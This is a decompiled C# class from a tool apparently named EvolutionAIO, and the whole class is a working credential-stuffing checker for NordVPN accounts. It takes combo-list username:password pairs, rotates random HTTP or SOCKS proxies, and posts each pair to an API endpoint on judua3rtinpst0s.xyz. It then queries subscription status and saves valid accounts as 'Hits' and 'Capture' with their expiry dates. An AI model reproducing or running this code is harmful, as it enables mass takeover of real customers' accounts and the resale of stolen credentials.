// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.NordVPN
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text.RegularExpressions;

namespace EvolutionAIO.Checkers
{
  internal class NordVPN
  {
    public static bool check(string[] s, string proxy)
    {
      if (0 >= Config.config.retries + 1)
        return false;
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
            if (Menu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
            httpRequest.AddHeader("Pragma", "no-cache");
            httpRequest.AddHeader("Accept", "*/*");
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
            string str1 = "username=" + s[0] + "&password=" + s[1];
            HttpResponse httpResponse1 = httpRequest.Post("https://judua3rtinpst0s.xyz/v1/users/tokens", str1, "application/x-www-form-urlencoded");
            if (httpResponse1.ToString().Contains("\"message\":\"Unauthorized\""))
              return false;
            if (httpResponse1.ToString().Contains("\"user_id\":"))
            {
              string str2 = Menu.Base64Encode("token:" + Regex.Match(httpResponse1.ToString(), "token\":\"(.*)\",\"expires_at").Groups[1].Value);
              httpRequest.AddHeader("Authorization", "Basic " + str2);
              HttpResponse httpResponse2 = httpRequest.Get("https://judua3rtinpst0s.xyz/v1/users/services");
              if (httpResponse2.ToString() == "[]")
              {
                ++Menu.frees;
                if (Menu.p1 == "2")
                  Colorful.Console.Write(" [/] " + s[0] + ":" + s[1] + " | FREE\n", Color.Yellow);
                Save.AsResult(nameof (NordVPN), "Frees", s[0] + ":" + s[1] + " | FREE");
                return false;
              }
              string str3 = Menu.Parse(httpResponse2.ToString(), "expires_at\":\"", "\"");
              if (str3.Contains("2019") || str3.Contains("2018") || (str3.Contains("2020") || str3.Contains("2017")) || (str3.Contains("2016") || str3.Contains("2015") || str3.Contains("2001")))
              {
                ++Menu.frees;
                if (Menu.p1 == "2")
                  Colorful.Console.Write(" [/] " + s[0] + ":" + s[1] + " | FREE\n", Color.Yellow);
                Save.AsResult(nameof (NordVPN), "Frees", s[0] + ":" + s[1] + " | FREE");
                return false;
              }
              if (Menu.p1 == "2")
                Colorful.Console.Write(" [+] " + s[0] + ":" + s[1] + " | Expires: " + str3 + "\n", Color.Green);
              ++Menu.hits;
              Save.AsResult(nameof (NordVPN), "Capture", s[0] + ":" + s[1] + " | Expires: " + str3);
              Save.AsResult(nameof (NordVPN), "Hits", s[0] + ":" + s[1]);
              return false;
            }
            ++Menu.retries;
          }
        }
        catch (Exception ex)
        {
          if (ex.ToString().Contains("Index was outside the bounds of the array") || ex.ToString().Contains("The error on the client side. Status code: 401"))
            return false;
          if (ex.ToString().Contains("Status code: 429"))
            ++Menu.retries;
          else
            ++Menu.errors;
        }
      }
    }
  }
}
